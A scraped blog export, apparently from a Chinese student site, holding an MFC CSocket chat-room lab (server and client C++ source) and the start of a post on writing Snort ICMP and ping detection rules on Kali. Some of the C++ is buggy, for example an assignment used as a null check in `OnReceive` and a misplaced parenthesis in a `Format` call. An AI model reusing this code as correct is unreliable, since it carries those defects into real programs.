1sockClient.Close(); 服务器端：创建监听套接字对象的时候，要用众所周知的保留端口号 服务器端：收到连接请求之后，需要创建一个专门用于连接的套接字对象。（即每个与服务器连接的客户端都有一个专属的用于连接和数据交换的套接字对象） 实验过程（代码分析）👉创造程序框架 （MFC基于对话框） 👉添加控件对象 👉添加控件成员变量 CSocket类从CAsynSocket类继承了许多成员函数，封装了Windows套接字应用程序编程接口API。 应用程序类CTsApp、CTcApp对应文件VC++自动生成 ###派生类CLSocket、CCSocket对应文件 服务器端： CLSocket，专用于监听客户端的连接请求（添加OnAccept事件处理函数） CCSocket，专用于客户端建立连接并交换数据（添加OnReceive事件处理函数） 添加事件响应函数，用于停止服务、和监听 ✏️LSocket.h 123456789101112#pragma onceclass CTsDlg;class CLSocket : public CSocket&#123; DECLARE_DYNAMIC(CLSocket);public: CLSocket(CTsDlg* m_pDlg); virtual ~CLSocket(); CTsDlg* m_pDlg;protected: virtual void OnAccept(int nErrorCode);&#125;; ✏️LSocket.cpp 1234567891011121314151617181920#include &quot;pch.h&quot;#include &quot;LSocket.h&quot;#include &quot;tsDlg.h&quot;CLSocket::CLSocket(CTsDlg* pDlg)&#123; m_pDlg = pDlg;&#125;CLSocket::~CLSocket()&#123; m_pDlg = NULL;&#125;void CLSocket::OnAccept(int nErrorCode)&#123; CSocket::OnAccept(nErrorCode); m_pDlg-&gt;OnAccept();&#125;IMPLEMENT_DYNAMIC(CLSocket, CSocket) ✏️CSocket.h 123456789101112131415161718192021222324#pragma onceclass CTsDlg;class CMsg;class CCSocket:public CSocket&#123; DECLARE_DYNAMIC(CCSocket);public: CCSocket(CTsDlg* pDlg); virtual ~CCSocket();public: CTsDlg* m_pDlg; CSocketFile* m_pFile; CArchive* m_pArchiveIn; CArchive* m_pArchiveOut;public: void Initialize(); void SendMessage(CMsg* pMsg); void ReceiveMessage(CMsg* pMsg);protected: virtual void OnReceive(int nErrorCode);&#125;; ✏️CSocket.cpp 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &quot;pch.h&quot;#include &quot;CSocket.h&quot;#include &quot;tsDlg.h&quot;#include &quot;Msg.h&quot;CCSocket::CCSocket(CTsDlg* pDlg)&#123; m_pDlg = pDlg; m_pFile = NULL; m_pArchiveIn = NULL; m_pArchiveOut = NULL;&#125;CCSocket::~CCSocket()&#123; m_pDlg = NULL; if (m_pArchiveOut != NULL) delete m_pArchiveOut; if (m_pArchiveIn != NULL) delete m_pArchiveIn; if (m_pFile != NULL) delete m_pFile;&#125;void CCSocket::Initialize()&#123; m_pFile = new CSocketFile(this, TRUE); m_pArchiveIn = new CArchive(m_pFile, CArchive::load); m_pArchiveOut = new CArchive(m_pFile, CArchive::store);&#125;void CCSocket::SendMessage(CMsg* pMsg)&#123; if (m_pArchiveOut != NULL) &#123; pMsg-&gt;Serialize(*m_pArchiveOut); m_pArchiveOut-&gt;Flush(); &#125;&#125;void CCSocket::ReceiveMessage(CMsg* pMsg)&#123; pMsg-&gt;Serialize(*m_pArchiveIn);&#125;void CCSocket::OnReceive(int nErrorCode)&#123; CSocket::OnReceive(nErrorCode); m_pDlg-&gt;OnReceive(this);&#125;IMPLEMENT_DYNAMIC(CCSocket,CSocket) 客户端: CCSocket，专用于于服务器建立连接并交换数据（添加OnReceive事件处理函数） ✏️CSocket.h 1234567891011121314#pragma onceclass CTcDlg;class CCSocket:public CSocket&#123; DECLARE_DYNAMIC(CCSocket);public: CCSocket(CTcDlg* pDlg); virtual ~CCSocket(); CTcDlg* m_pDlg;protected: virtual void OnReceive(int nErrorCode);&#125;; ✏️CSocket.cpp 1234567891011121314151617181920#include &quot;pch.h&quot;#include &quot;CSocket.h&quot;#include &quot;tcDlg.h&quot;IMPLEMENT_DYNAMIC(CCSocket,CSocket)CCSocket::CCSocket(CTcDlg* pDlg)&#123; m_pDlg = pDlg;&#125;CCSocket::~CCSocket()&#123; m_pDlg = NULL;&#125;void CCSocket::OnReceive(int nErrorCode)&#123; CSocket::OnReceive(nErrorCode); if (nErrorCode == 0) m_pDlg-&gt;OnReceive();&#125; 对话框类CTsDlg、CTcDlg对应文件主要是对控件变量的声明和定义。 服务器端： ✏️tsDlg.h 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556// tsDlg.h: 头文件//#pragma once#include &quot;CSocket.h&quot;#include &quot;LSocket.h&quot;class CMsg;// CTsDlg 对话框class CTsDlg : public CDialogEx&#123;// 构造public: CTsDlg(CWnd* pParent = nullptr); // 标准构造函数// 对话框数据#ifdef AFX_DESIGN_TIME enum &#123; IDD = IDD_TS_DIALOG &#125;;#endif protected: virtual void DoDataExchange(CDataExchange* pDX); // DDX/DDV 支持// 实现protected: HICON m_hIcon; // 生成的消息映射函数 virtual BOOL OnInitDialog(); afx_msg void OnSysCommand(UINT nID, LPARAM lParam); afx_msg void OnPaint(); afx_msg HCURSOR OnQueryDragIcon(); DECLARE_MESSAGE_MAP()public: CStatic m_staNum; CButton m_btnListen; CButton m_btnClose; CListBox m_listMsg; UINT m_nPort; afx_msg void OnButtonListen(); afx_msg void OnClose(); // 生成的消息映射函数 public: CLSocket* m_pLSocket; CPtrList m_connList; void OnAccept(); void OnReceive(CCSocket* pSocket); void backClients(CMsg* pMsg);&#125;; ✏️tsDlg.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273// tsDlg.cpp: 实现文件//#include &quot;pch.h&quot;#include &quot;framework.h&quot;#include &quot;ts.h&quot;#include &quot;tsDlg.h&quot;#include &quot;afxdialogex.h&quot;#include &quot;Msg.h&quot;#ifdef _DEBUG#define new DEBUG_NEW#endif// 用于应用程序“关于”菜单项的 CAboutDlg 对话框class CAboutDlg : public CDialogEx&#123;public: CAboutDlg();// 对话框数据#ifdef AFX_DESIGN_TIME enum &#123; IDD = IDD_ABOUTBOX &#125;;#endif protected: virtual void DoDataExchange(CDataExchange* pDX); // DDX/DDV 支持// 实现protected: DECLARE_MESSAGE_MAP()&#125;;CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)&#123;&#125;void CAboutDlg::DoDataExchange(CDataExchange* pDX)&#123; CDialogEx::DoDataExchange(pDX);&#125;BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)END_MESSAGE_MAP()// CTsDlg 对话框CTsDlg::CTsDlg(CWnd* pParent /*=nullptr*/) : CDialogEx(IDD_TS_DIALOG, pParent) &#123; m_nPort = 0; m_hIcon = AfxGetApp()-&gt;LoadIcon(IDR_MAINFRAME); m_pLSocket = NULL;&#125;void CTsDlg::DoDataExchange(CDataExchange* pDX)&#123; CDialogEx::DoDataExchange(pDX); DDX_Control(pDX, IDC_STATIC_NUM, m_staNum); DDX_Text(pDX, IDC_EDIT_PORT, m_nPort); DDX_Control(pDX, IDC_BUTTON_LISTEN, m_btnListen); DDX_Control(pDX, IDOK, m_btnClose); DDX_Control(pDX, IDC_LIST_MSG, m_listMsg);&#125;BEGIN_MESSAGE_MAP(CTsDlg, CDialogEx) ON_WM_SYSCOMMAND() ON_WM_PAINT() ON_WM_QUERYDRAGICON() ON_BN_CLICKED(IDOK, &amp;CTsDlg::OnClose) ON_BN_CLICKED(IDC_BUTTON_LISTEN, &amp;CTsDlg::OnButtonListen)END_MESSAGE_MAP()// CTsDlg 消息处理程序BOOL CTsDlg::OnInitDialog()&#123; CDialogEx::OnInitDialog(); // 将“关于...”菜单项添加到系统菜单中。 // IDM_ABOUTBOX 必须在系统命令范围内。 ASSERT((IDM_ABOUTBOX &amp; 0xFFF0) == IDM_ABOUTBOX); ASSERT(IDM_ABOUTBOX &lt; 0xF000); CMenu* pSysMenu = GetSystemMenu(FALSE); if (pSysMenu != nullptr) &#123; BOOL bNameValid; CString strAboutMenu; bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX); ASSERT(bNameValid); if (!strAboutMenu.IsEmpty()) &#123; pSysMenu-&gt;AppendMenu(MF_SEPARATOR); pSysMenu-&gt;AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu); &#125; &#125; // 设置此对话框的图标。 当应用程序主窗口不是对话框时，框架将自动 // 执行此操作 SetIcon(m_hIcon, TRUE); // 设置大图标 SetIcon(m_hIcon, FALSE); // 设置小图标 // TODO: 在此添加额外的初始化代码 m_nPort = 8000; UpdateData(FALSE); GetDlgItem(IDOK)-&gt;EnableWindow(FALSE); return TRUE; // 除非将焦点设置到控件，否则返回 TRUE&#125;void CTsDlg::OnSysCommand(UINT nID, LPARAM lParam)&#123; if ((nID &amp; 0xFFF0) == IDM_ABOUTBOX) &#123; CAboutDlg dlgAbout; dlgAbout.DoModal(); &#125; else &#123; CDialogEx::OnSysCommand(nID, lParam); &#125;&#125;// 如果向对话框添加最小化按钮，则需要下面的代码// 来绘制该图标。 对于使用文档/视图模型的 MFC 应用程序，// 这将由框架自动完成。void CTsDlg::OnPaint()&#123; if (IsIconic()) &#123; CPaintDC dc(this); // 用于绘制的设备上下文 SendMessage(WM_ICONERASEBKGND, reinterpret_cast&lt;WPARAM&gt;(dc.GetSafeHdc()), 0); // 使图标在工作区矩形中居中 int cxIcon = GetSystemMetrics(SM_CXICON); int cyIcon = GetSystemMetrics(SM_CYICON); CRect rect; GetClientRect(&amp;rect); int x = (rect.Width() - cxIcon + 1) / 2; int y = (rect.Height() - cyIcon + 1) / 2; // 绘制图标 dc.DrawIcon(x, y, m_hIcon); &#125; else &#123; CDialogEx::OnPaint(); &#125;&#125;//当用户拖动最小化窗口时系统调用此函数取得光标//显示。HCURSOR CTsDlg::OnQueryDragIcon()&#123; return (HCURSOR) m_hIcon;&#125;void CTsDlg::OnClose()&#123; CMsg msg; msg.m_strText = &quot;服务器终止服务！&quot;; delete m_pLSocket; m_pLSocket = NULL; while (!m_connList.IsEmpty()) &#123; CCSocket* pSocket = (CCSocket*)m_connList.RemoveHead(); pSocket-&gt;SendMessage(&amp;msg); delete pSocket; &#125; while (m_listMsg.GetCount() != 0) m_listMsg.DeleteString(0); GetDlgItem(IDC_EDIT_PORT)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_BUTTON_LISTEN)-&gt;EnableWindow(TRUE); GetDlgItem(IDOK)-&gt;EnableWindow(FALSE);&#125;void CTsDlg::OnButtonListen()&#123; UpdateData(TRUE); m_pLSocket = new CLSocket(this); if (!m_pLSocket-&gt;Create(m_nPort)) &#123; delete m_pLSocket; m_pLSocket = NULL; AfxMessageBox(_T(&quot;创建监听套接字错误！&quot;)); return; &#125; if (!m_pLSocket-&gt;Listen()) &#123; delete m_pLSocket; m_pLSocket = NULL; AfxMessageBox(_T(&quot;启动监听错误！&quot;)); return; &#125; GetDlgItem(IDC_EDIT_PORT)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_BUTTON_LISTEN)-&gt;EnableWindow(FALSE); GetDlgItem(IDOK)-&gt;EnableWindow(TRUE);&#125;void CTsDlg::OnAccept()&#123; CCSocket* pSocket = new CCSocket(this); if (m_pLSocket-&gt;Accept(*pSocket)) &#123; pSocket-&gt;Initialize(); m_connList.AddTail(pSocket); CString strTemp; strTemp.Format(_T(&quot;在线人数：%d&quot;, m_connList.GetCount())); m_staNum.SetWindowText(strTemp); &#125; else delete pSocket;&#125;void CTsDlg::OnReceive(CCSocket* pSocket)&#123; static CMsg msg; do &#123; pSocket-&gt;ReceiveMessage(&amp;msg); m_listMsg.AddString(msg.m_strText); backClients(&amp;msg); if (msg.m_bClose) &#123; pSocket-&gt;Close(); POSITION pos, temp; for (pos = m_connList.GetHeadPosition(); pos != NULL;) &#123; temp = pos; CCSocket* pSock = (CCSocket*)m_connList.GetNext(pos); if (pSock == pSocket) &#123; m_connList.RemoveAt(temp); CString strTemp; strTemp.Format((_T(&quot;在线人数：%d&quot;, m_connList.GetCount()))); m_staNum.SetWindowText(strTemp); break; &#125; &#125; delete pSocket; break; &#125; &#125; while (!pSocket-&gt;m_pArchiveIn-&gt;IsBufferEmpty());&#125;void CTsDlg::backClients(CMsg* pMsg)&#123; for (POSITION pos = m_connList.GetHeadPosition(); pos != NULL;) &#123; CCSocket* pSocket = (CCSocket*)m_connList.GetNext(pos); pSocket-&gt;SendMessage(pMsg); &#125;&#125; 客户端： ✏️tcDlg.h 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657// tcDlg.h: 头文件//#include &quot;CSocket.h&quot;#pragma once// CTcDlg 对话框class CTcDlg : public CDialogEx&#123;// 构造public: CTcDlg(CWnd* pParent = nullptr); // 标准构造函数// 对话框数据#ifdef AFX_DESIGN_TIME enum &#123; IDD = IDD_TC_DIALOG &#125;;#endif protected: virtual void DoDataExchange(CDataExchange* pDX); // DDX/DDV 支持// 实现protected: HICON m_hIcon; // 生成的消息映射函数 virtual BOOL OnInitDialog(); afx_msg void OnSysCommand(UINT nID, LPARAM lParam); afx_msg void OnPaint(); afx_msg HCURSOR OnQueryDragIcon(); DECLARE_MESSAGE_MAP()public: afx_msg void OnEnChangeEditCname(); afx_msg void OnEnChangeEdit2(); CButton m_btnClose; CString m_strCName; CString m_strSName; UINT m_nPort; CString m_strMsg; CButton m_btnConn; CButton m_Send; CListBox m_listMsg; afx_msg void OnSend(); afx_msg void OnButtonConn(); afx_msg void OnButtonClose(); afx_msg void OnDestroy(); CCSocket* m_pSocket; CSocketFile* m_pFile; CArchive* m_pArchiveIn; CArchive* m_pArchiveOut; void OnReceive(); void ReceiveMsg(); void SendMsg(CString&amp; strText, bool st);&#125;; ✏️tcDlg.cpp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363// tcDlg.cpp: 实现文件//#include &quot;pch.h&quot;#include &quot;framework.h&quot;#include &quot;tc.h&quot;#include &quot;tcDlg.h&quot;#include &quot;afxdialogex.h&quot;#include &quot;CSocket.h&quot;#include &quot;Msg.h&quot;#ifdef _DEBUG#define new DEBUG_NEW#endif// 用于应用程序“关于”菜单项的 CAboutDlg 对话框class CAboutDlg : public CDialogEx&#123;public: CAboutDlg();// 对话框数据#ifdef AFX_DESIGN_TIME enum &#123; IDD = IDD_ABOUTBOX &#125;;#endif protected: virtual void DoDataExchange(CDataExchange* pDX); // DDX/DDV 支持// 实现protected: DECLARE_MESSAGE_MAP()&#125;;CAboutDlg::CAboutDlg() : CDialogEx(IDD_ABOUTBOX)&#123;&#125;void CAboutDlg::DoDataExchange(CDataExchange* pDX)&#123; CDialogEx::DoDataExchange(pDX);&#125;BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)END_MESSAGE_MAP()// CTcDlg 对话框CTcDlg::CTcDlg(CWnd* pParent /*=nullptr*/) : CDialogEx(IDD_TC_DIALOG, pParent)&#123; m_strCName=_T(&quot;&quot;); m_strSName=_T(&quot;&quot;); m_nPort = 0; m_strMsg=_T(&quot;&quot;); m_hIcon = AfxGetApp()-&gt;LoadIcon(IDR_MAINFRAME); m_pSocket = NULL; m_pFile = NULL; m_pArchiveIn = NULL; m_pArchiveOut = NULL;&#125;void CTcDlg::DoDataExchange(CDataExchange* pDX)&#123; CDialogEx::DoDataExchange(pDX); DDX_Control(pDX, IDC_BUTTON_CLOSE, m_btnClose); DDX_Text(pDX, IDC_EDIT_CNAME, m_strCName); DDX_Text(pDX, IDC_EDIT_SNAME, m_strSName); DDX_Text(pDX, IDC_EDIT_PORT, m_nPort); DDX_Text(pDX, IDC_EDIT_MSG, m_strMsg); DDX_Control(pDX, IDC_BUTTON_CONN, m_btnConn); DDX_Control(pDX, IDOK, m_Send); DDX_Control(pDX, IDC_LIST_MSG, m_listMsg);&#125;BEGIN_MESSAGE_MAP(CTcDlg, CDialogEx) ON_WM_SYSCOMMAND() ON_WM_PAINT() ON_WM_QUERYDRAGICON() //ON_EN_CHANGE(IDC_EDIT2, &amp;CTcDlg::OnEnChangeEdit2) ON_BN_CLICKED(IDOK, &amp;CTcDlg::OnSend) ON_BN_CLICKED(IDC_BUTTON_CONN, &amp;CTcDlg::OnButtonConn) ON_BN_CLICKED(IDC_BUTTON_CLOSE, &amp;CTcDlg::OnButtonClose) ON_WM_DESTROY()END_MESSAGE_MAP()// CTcDlg 消息处理程序BOOL CTcDlg::OnInitDialog()&#123; CDialogEx::OnInitDialog(); // 将“关于...”菜单项添加到系统菜单中。 // IDM_ABOUTBOX 必须在系统命令范围内。 ASSERT((IDM_ABOUTBOX &amp; 0xFFF0) == IDM_ABOUTBOX); ASSERT(IDM_ABOUTBOX &lt; 0xF000); CMenu* pSysMenu = GetSystemMenu(FALSE); if (pSysMenu != nullptr) &#123; BOOL bNameValid; CString strAboutMenu; bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX); ASSERT(bNameValid); if (!strAboutMenu.IsEmpty()) &#123; pSysMenu-&gt;AppendMenu(MF_SEPARATOR); pSysMenu-&gt;AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu); &#125; &#125; // 设置此对话框的图标。 当应用程序主窗口不是对话框时，框架将自动 // 执行此操作 SetIcon(m_hIcon, TRUE); // 设置大图标 SetIcon(m_hIcon, FALSE); // 设置小图标 // TODO: 在此添加额外的初始化代码 m_strCName = _T(&quot;客户 1&quot;); m_nPort = 8000; m_strSName = _T(&quot;localhost&quot;); GetDlgItem(IDC_EDIT_MSG)-&gt;EnableWindow(FALSE); GetDlgItem(IDOK)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_BUTTON_CLOSE)-&gt;EnableWindow(FALSE); UpdateData(FALSE); return TRUE; // 除非将焦点设置到控件，否则返回 TRUE&#125;void CTcDlg::OnSysCommand(UINT nID, LPARAM lParam)&#123; if ((nID &amp; 0xFFF0) == IDM_ABOUTBOX) &#123; CAboutDlg dlgAbout; dlgAbout.DoModal(); &#125; else &#123; CDialogEx::OnSysCommand(nID, lParam); &#125;&#125;// 如果向对话框添加最小化按钮，则需要下面的代码// 来绘制该图标。 对于使用文档/视图模型的 MFC 应用程序，// 这将由框架自动完成。void CTcDlg::OnPaint()&#123; if (IsIconic()) &#123; CPaintDC dc(this); // 用于绘制的设备上下文 SendMessage(WM_ICONERASEBKGND, reinterpret_cast&lt;WPARAM&gt;(dc.GetSafeHdc()), 0); // 使图标在工作区矩形中居中 int cxIcon = GetSystemMetrics(SM_CXICON); int cyIcon = GetSystemMetrics(SM_CYICON); CRect rect; GetClientRect(&amp;rect); int x = (rect.Width() - cxIcon + 1) / 2; int y = (rect.Height() - cyIcon + 1) / 2; // 绘制图标 dc.DrawIcon(x, y, m_hIcon); &#125; else &#123; CDialogEx::OnPaint(); &#125;&#125;//当用户拖动最小化窗口时系统调用此函数取得光标//显示。HCURSOR CTcDlg::OnQueryDragIcon()&#123; return static_cast&lt;HCURSOR&gt;(m_hIcon);&#125;void CTcDlg::OnEnChangeEdit2()&#123; // TODO: 如果该控件是 RICHEDIT 控件，它将不 // 发送此通知，除非重写 CDialogEx::OnInitDialog() // 函数并调用 CRichEditCtrl().SetEventMask()， // 同时将 ENM_CHANGE 标志“或”运算到掩码中。 // TODO: 在此添加控件通知处理程序代码&#125;void CTcDlg::OnSend()&#123; // TODO: 在此添加控件通知处理程序代码 UpdateData(TRUE); if (!m_strMsg.IsEmpty()) &#123; this-&gt;SendMsg(m_strCName + (_T(&quot;：&quot;)) + m_strMsg, FALSE); m_strMsg = _T(&quot;&quot;); UpdateData(FALSE); &#125;&#125;void CTcDlg::OnButtonConn()&#123; m_pSocket = new CCSocket(this); if (!m_pSocket-&gt;Create()) &#123; delete m_pSocket; m_pSocket = NULL; AfxMessageBox(_T(&quot;套接字创建错误！&quot;)); return; &#125; if (!m_pSocket-&gt;Connect(m_strSName, m_nPort)) &#123; delete m_pSocket; m_pSocket = NULL; AfxMessageBox(_T(&quot;无法连接服务器错误！&quot;)); return; &#125; m_pFile = new CSocketFile(m_pSocket); m_pArchiveIn = new CArchive(m_pFile, CArchive::load); m_pArchiveOut = new CArchive(m_pFile, CArchive::store); UpdateData(TRUE); CString strTemp; strTemp = m_strCName +(_T( &quot;:进入聊天室&quot;)); SendMsg(strTemp, FALSE); GetDlgItem(IDC_EDIT_MSG)-&gt;EnableWindow(TRUE); GetDlgItem(IDOK)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_BUTTON_CLOSE)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_EDIT_CNAME)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_EDIT_SNAME)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_EDIT_PORT)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_BUTTON_CONN)-&gt;EnableWindow(FALSE);&#125;void CTcDlg::OnButtonClose()&#123; CString strTemp; strTemp = m_strCName + (_T(&quot;：离开聊天室&quot;)); SendMsg(strTemp, TRUE); delete m_pArchiveOut; m_pArchiveOut = NULL; delete m_pArchiveIn; m_pArchiveIn = NULL; delete m_pFile; m_pFile = NULL; m_pSocket-&gt;Close(); delete m_pSocket; m_pSocket = NULL; while (m_listMsg.GetCount() != 0) m_listMsg.DeleteString(0); GetDlgItem(IDC_EDIT_MSG)-&gt;EnableWindow(FALSE); GetDlgItem(IDOK)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_BUTTON_CLOSE)-&gt;EnableWindow(FALSE); GetDlgItem(IDC_EDIT_CNAME)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_EDIT_SNAME)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_EDIT_PORT)-&gt;EnableWindow(TRUE); GetDlgItem(IDC_BUTTON_CONN)-&gt;EnableWindow(TRUE);&#125;void CTcDlg::OnDestroy()&#123; CDialog::OnDestroy(); if ((m_pSocket != NULL) &amp;&amp; (m_pFile != NULL) &amp;&amp; (m_pArchiveOut != NULL)) &#123; CMsg msg; CString strTemp; strTemp = (_T(&quot;DDDD：离开聊天室！&quot;)); msg.m_bClose = TRUE; msg.m_strBuf = m_strCName + strTemp; msg.Serialize(*m_pArchiveOut); m_pArchiveOut-&gt;Flush(); &#125; delete m_pArchiveOut; m_pArchiveOut = NULL; delete m_pArchiveIn; m_pArchiveIn = NULL; delete m_pFile; m_pFile = NULL; if (m_pSocket != NULL) &#123; BYTE Buffer[50]; m_pSocket-&gt;ShutDown(); while (m_pSocket-&gt;Receive(Buffer, 50) &gt; 0); &#125; delete m_pSocket; m_pSocket = NULL;&#125;void CTcDlg::OnReceive()&#123; do &#123; ReceiveMsg(); if (m_pSocket = NULL) return; &#125; while (!m_pArchiveIn-&gt;IsBufferEmpty());&#125;void CTcDlg::ReceiveMsg()&#123; CMsg msg; TRY &#123; msg.Serialize(*m_pArchiveIn); m_listMsg.AddString(msg.m_strBuf); &#125; CATCH(CFileException, e) &#123; CString strTemp; strTemp = (_T(&quot;服务器重置连接！连接关闭！&quot;)); m_listMsg.AddString(strTemp); msg.m_bClose = TRUE; m_pArchiveOut-&gt;Abort(); delete m_pArchiveIn; m_pArchiveIn = NULL; delete m_pArchiveOut; m_pArchiveOut = NULL; delete m_pFile; m_pFile = NULL; delete m_pSocket; m_pSocket = NULL; &#125; END_CATCH&#125;void CTcDlg::SendMsg(CString&amp; strText, bool st)&#123; if (m_pArchiveOut != NULL) &#123; CMsg msg; msg.m_strBuf = strText; msg.m_bClose = st; msg.Serialize(*m_pArchiveOut); m_pArchiveOut-&gt;Flush(); &#125;&#125; 数据传输序列化处理类CMsg对应文件服务器端： ✏️Msg.h 1234567891011121314151617181920#pragma once// CMsg 命令目标class CMsg : public CObject&#123; DECLARE_DYNCREATE(CMsg);public: CMsg(); virtual ~CMsg();public: CString m_strText; BOOL m_bClose;public: virtual void Serialize(CArchive&amp;ar);&#125;; ✏️Msg.cpp 12345678910111213141516171819202122232425262728293031323334353637// CMsg.cpp: 实现文件//#include &quot;pch.h&quot;#include &quot;ts.h&quot;#include &quot;Msg.h&quot;// CMsgCMsg::CMsg()&#123; m_strText = _T(&quot;&quot;); m_bClose = FALSE;&#125;void CMsg::Serialize(CArchive &amp; ar)&#123; if (ar.IsStoring()) &#123; ar &lt;&lt; (WORD)m_bClose; ar &lt;&lt; m_strText; &#125; else &#123; WORD wd; ar &gt;&gt; wd; m_bClose = (BOOL)wd; ar &gt;&gt; m_strText; &#125;&#125;CMsg::~CMsg()&#123;&#125;IMPLEMENT_DYNAMIC(CMsg,CObject) 客户端： ✏️Msg.h 123456789101112131415#pragma once#include &lt;afx.h&gt;class CMsg : public CObject&#123; DECLARE_DYNCREATE(CMsg);public: CMsg(); virtual ~CMsg(); virtual void Serialize(CArchive&amp; ar); CString m_strBuf; BOOL m_bClose;&#125;; ✏️Msg.cpp 123456789101112131415161718192021222324252627#include &quot;pch.h&quot;#include &quot;Msg.h&quot;CMsg::CMsg() &#123; m_strBuf = _T(&quot;&quot;); m_bClose = FALSE;&#125;void CMsg::Serialize(CArchive&amp; ar)&#123; if (ar.IsStoring()) &#123; ar &lt;&lt; (WORD)m_bClose; ar &lt;&lt; m_strBuf; &#125; else &#123; WORD wd; ar &gt;&gt; wd; m_bClose = (BOOL)wd; ar &gt;&gt; m_strBuf; &#125;&#125;CMsg::~CMsg()&#123;&#125;IMPLEMENT_DYNAMIC(CMsg,CObject) 实验界面结果展示 实验过程中遇到的问题⛔️在Msg.h中声明了析构函数，但cpp中没有定义 💚在Msg.cpp中补上析构函数的定义 ⛔️ 字符问题 1strTemp = m_strCName + &quot;：进入聊天室&quot;; 💚在字符串前面，加上_T 1strTemp = m_strCName + (_T(&quot;：进入聊天室&quot;)); 实验参考书服务器端 客户端","categories":[{"name":"实验","slug":"实验","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/"},{"name":"网络编程","slug":"实验/网络编程","permalink":"https://gryffinbit.top/categories/%E5%AE%9E%E9%AA%8C/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"}],"tags":[{"name":"MFC","slug":"MFC","permalink":"https://gryffinbit.top/tags/MFC/"},{"name":"WinSock","slug":"WinSock","permalink":"https://gryffinbit.top/tags/WinSock/"},{"name":"CSocket","slug":"CSocket","permalink":"https://gryffinbit.top/tags/CSocket/"}],"author":"Gryffinbit"},{"title":"kali下snort报警规则设计和测试","slug":"kali下snort报警规则设计和测试","date":"2020-11-30T22:38:23.000Z","updated":"2024-11-12T06:59:33.000Z","comments":true,"path":"2020/12/01/kali下snort报警规则设计和测试/","permalink":"https://gryffinbit.top/2020/12/01/kali%E4%B8%8Bsnort%E6%8A%A5%E8%AD%A6%E8%A7%84%E5%88%99%E8%AE%BE%E8%AE%A1%E5%92%8C%E6%B5%8B%E8%AF%95/","excerpt":"","text":"snort报警规则设计和测试snort简单的报警规则在官网下载规则包（需要注册登陆）https://www.snort.org/downloads 我下载的是29151版本的 将snort安装目录的包用规则包进行替换 替换到snort-2.9.17文件夹内 练习一条规则👉在rules&#x2F;local.rules下进行规则配置。实现对内网的ICMP相关流量进行检测，并报警 编辑文件的时候都采用vim的方式 vim &lt;文件路径&gt; 以下操作都在snort的文件夹内完成。 cd &#x2F;snort-2.9.17 把下面的内容添加到local.rules里 1vim rules/local.rules 1alert icmp any any -&gt; 172.16.68.139 any (msg:&quot;ICMP&quot;;sid:41409) 测试规则，看是否有报错 小猪猪跑出来，成功运行 1snort -c rules/local.rules -T 利用Snort检测ping攻击在rules&#x2F;icmp-info.rules文件中设置如下规则： 1alert icmp any any -&gt; 172.16.68.139 any (msg:&quot;ICMP Large ICMP Packet&quot;;dsize:&gt;800;reference:arachoids,246; sid:499;rev:4;) tip：官方文档：This configuration file enables active response, to run snort in test mode -T you are required to supply an interface -i or test mode will fail to fully validate the configuration and exit with a FATAL error 检验规则是否报错： 1snort -c rules/icmp-info.rules -T 开启检测模式 1snort -i eth0 -c /snort-2.9.17/etc/snort.conf -A fast -l log/snort-detect/ ⛔️报错：Invalid keyword ‘preprocessor’ 官网下载的配置文件，默认把preprocessor reputation注释掉。找到这行。看配置文件，把preprocessor注释打开。 不设置黑白名单，可以把黑白名单注释掉。 ❗️注意！！！！！！！！！逗号问题！！！！在每个配置的最后一行，不能有,\\。 不然会出现类似这种的报错。莫名其妙的，天真的我之前还认真的去看了官网配置。。 再次运行监测模式 ⛔️报错：ERROR: Perfmonitor: Cannot open base stats file “&#x2F;var&#x2F;snort&#x2F;snort.stats”. Fatal Error, Quitting.. 💚打开sonrt.conf这行注释掉 # preprocessor perfmonitor: time 300 file &#x2F;var&#x2F;snort&#x2F;snort.stats pktcnt 10000 没有报错了！小猪猪跑出来，运行如德芙巧克力一般丝滑～尽享愉悦，纵享丝滑～ 在另一台主机上ping snort所在主机，log下面会生成警报日志 kali 上开启snort入侵检测 1snort -i eth0 -c /snort-2.9.17/etc/snort.conf -A fast -l log/snort-detect/ 另一台主机去ping 生成了alert警告日志 日志内记录的内容 